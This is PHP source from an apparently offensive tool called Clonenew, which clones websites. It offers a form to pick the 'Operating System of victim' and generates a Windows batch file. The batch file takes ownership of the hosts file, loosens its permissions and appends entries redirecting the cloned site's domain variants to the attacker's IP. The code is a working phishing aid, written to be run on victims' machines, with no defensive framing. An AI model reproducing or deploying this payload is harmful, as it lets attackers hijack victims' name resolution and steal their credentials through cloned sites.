<?php

/*
*  Clonenew is a programm for clone websites.
*  Copyright (c) 2017 Barchampas Gerasimos.
*
*  Clonenew is free software: you can redistribute it and/or modify
*  it under the terms of the GNU Affero General Public License as published by
*  the Free Software Foundation, either version 3 of the License, or
*  (at your option) any later version.
*
*  Clonenew is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU Affero General Public License for more details.
*
*  You should have received a copy of the GNU Affero General Public License
*  along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*/

?>

<html>
<head>

    <title> clonenew </title>
  
  <link rel="icon" type="image/jpg" href="/css/clone_title.jpg" />

 <link rel="stylesheet" type="text/css" href="css/dns.css">



</head>

<body id="body">


    <div class="shell-wrap">
  <p class="shell-top-bar"> Dns fake generator </p>
  
 
      <br><br><br><br>


      <div align="center">
    <form action="" method="post">

   <select name="fake_dns" id="select_dns" required>
     <option selected disabled> Operating System of victim </option>
      <optgroup label="Microsoft windows">
    <option value ="windows nt">   Windows NT  </option>
    <option value ="windows 95">   Windows 95  </option>
    <option value ="windows 2000"> Windows 2000  </option>
    <option value ="windows xp">   Windows XP  </option>
    <option value ="windows 7">    Windows 7  </option>
    <option value ="windows 8">    Windows 8  </option>
    <option value ="windows 10">   Windows 10  </option>
      </optgroup>
  </select>
    
     <br><br><br>

   <input type="submit" name="submit_dns" value="Fake dns generator" id="submit">

  </form>
    </div>

  
       <br>   
 

      <div align="center">
        <a href="/">
    <input type="button" value="No fake dns(Normal attack)" id="submit">
         </a>
      </div>
 
   
    

  <div id="footer">
   <img src="/css/clone_diagram.jpg" height="300" width="600">
   </div>



 


</body>
</html>




<?php



 clearstatcache();

  session_start();


  require_once('class_tools.php');

  if (class_exists('INPUT_DATA_AVAILABLE')) 
    {
    $obj_dns = new INPUT_DATA_AVAILABLE;
      



   if (isset($_POST['submit_dns']))
      {
      $fake_dns   = $obj_dns-> SAFE_DATA_ENTER($_POST['fake_dns']);
       
 
       if($fake_dns == true)
        {


         if($fake_dns == "windows 7")
           {
   

              if (isset($_SESSION['site_hack']))             
                {

            $ipv4 = trim(shell_exec('shell/./my_ipv4.sh'));

            $dns = '"' .$_SESSION['site_hack'] .'"';



            $dns1 = str_replace ("https://","",$dns);
 
            $dns2 = str_replace ("https://www.","",$dns);
 
            $dns3 = str_replace ("com","gr",$dns1);

            $dns4 = str_replace ("com","gr",$dns2);

            $dns5 = str_replace ("http://","",$dns);

            $dns6 = str_replace ("http://www.","",$dns);

            $dns7 = str_replace ("com","gr",$dns5);

            $dns8 = str_replace ("com","gr",$dns6);

            $hosts = fopen("export/l_win.bat", "w") or die("Unable to open file!");
            $lines_hosts = '@echo off' 
                       .PHP_EOL .'Takeown /f C:\Windows\System32\drivers\etc\hosts '
                       .PHP_EOL .'icacls C:\Windows\System32\drivers\etc\hosts  /grant Administrator:F'
                       .PHP_EOL .'icacls C:\Windows\System32\drivers\etc\hosts  /grant Administrators:F'
                       .PHP_EOL .'icacls C:\Windows\System32\drivers\etc\hosts  /grant SYSTEM:F'
                       .PHP_EOL .'icacls C:\Windows\System32\drivers\etc\hosts /grant "Authenticated Users":F'
                       .PHP_EOL .'icacls C:\Windows\System32\drivers\etc\hosts  /grant "domain\users":R'
                       .PHP_EOL ."echo $ipv4"  ." "  .trim($dns,  '"')  ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ '
                       .PHP_EOL ."echo $ipv4"  ." "  .trim($dns1, '"')  ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ '
                       .PHP_EOL ."echo $ipv4"  ." "  .trim($dns2, '"')  ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ '
                       .PHP_EOL ."echo $ipv4"  ." "  .trim($dns3, '"')  ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ '
                       .PHP_EOL ."echo $ipv4"  ." "  .trim($dns4, '"')  ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ '
                       .PHP_EOL ."echo $ipv4"  ." "  .trim($dns5, '"')  ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ '
                       .PHP_EOL ."echo $ipv4"  ." "  .trim($dns6, '"')  ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ '
                       .PHP_EOL ."echo $ipv4"  ." "  .trim($dns7, '"')  ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ '
                       .PHP_EOL ."echo $ipv4"  ." "  .trim($dns8, '"')  ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ '
                       .PHP_EOL .'exit';



            fwrite($hosts, $lines_hosts);
            fclose($hosts);

           chmod("/var/www/clonenew/export/l_win.bat", 0777);


              } // end of isset session site hack


          if (isset($_SESSION['site_ready']))
              {

            $dns_ready = '"' .$_SESSION['site_ready'] .'"';


            $dns_ready1 = str_replace ("https://","",$dns_ready);
 
            $dns_ready2 = str_replace ("https://www.","",$dns_ready);
 
            $dns_ready3 = str_replace ("com","gr",$dns_ready1);

            $dns_ready4 = str_replace ("com","gr",$dns_ready2);


            $hosts_ready = fopen("export/l_win.bat", "w") or die("Unable to open file!");
            $lines_hosts_ready = '@echo off' 
                       .PHP_EOL .'Takeown /f C:\Windows\System32\drivers\etc\hosts '
                       .PHP_EOL .'icacls C:\Windows\System32\drivers\etc\hosts  /grant Administrator:F'
                       .PHP_EOL .'icacls C:\Windows\System32\drivers\etc\hosts  /grant Administrators:F'
                       .PHP_EOL .'icacls C:\Windows\System32\drivers\etc\hosts  /grant SYSTEM:F'
                       .PHP_EOL .'icacls C:\Windows\System32\drivers\etc\hosts /grant "Authenticated Users":F'
                       .PHP_EOL .'icacls C:\Windows\System32\drivers\etc\hosts  /grant "domain\users":R'
                       .PHP_EOL ."echo $ipv4"  ." "   .trim($dns_ready, '"')   ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ ' 
                       .PHP_EOL ."echo $ipv4"  ." "   .trim($dns_ready1, '"')  ." "  .'>> C:\Windows\System32\drivers\etc\hosts\  '
                       .PHP_EOL ."echo $ipv4"  ." "  .trim($dns_ready2, '"')   ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ '
                       .PHP_EOL ."echo $ipv4"  ." "  .trim($dns_ready3, '"')   ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ '
                       .PHP_EOL ."echo $ipv4"  ." "  .trim($dns_ready4, '"')   ." "  .'>> C:\Windows\System32\drivers\etc\hosts\ '
                       .PHP_EOL .'exit';
            fwrite($hosts_ready, $lines_hosts_ready);
            fclose($hosts_ready);



        chmod("/var/www/clonenew/export/l_win.bat", 0777);
            
             } // end of isset session site_ready


            }


  echo "<script type='text/javascript'>alert('Fake dns for $fake_dns generated');
         </script>";
          echo ("<script>location.href='/'</script>");
         } 
 

       } // end of submit dns



   } // end if isset of class



?>
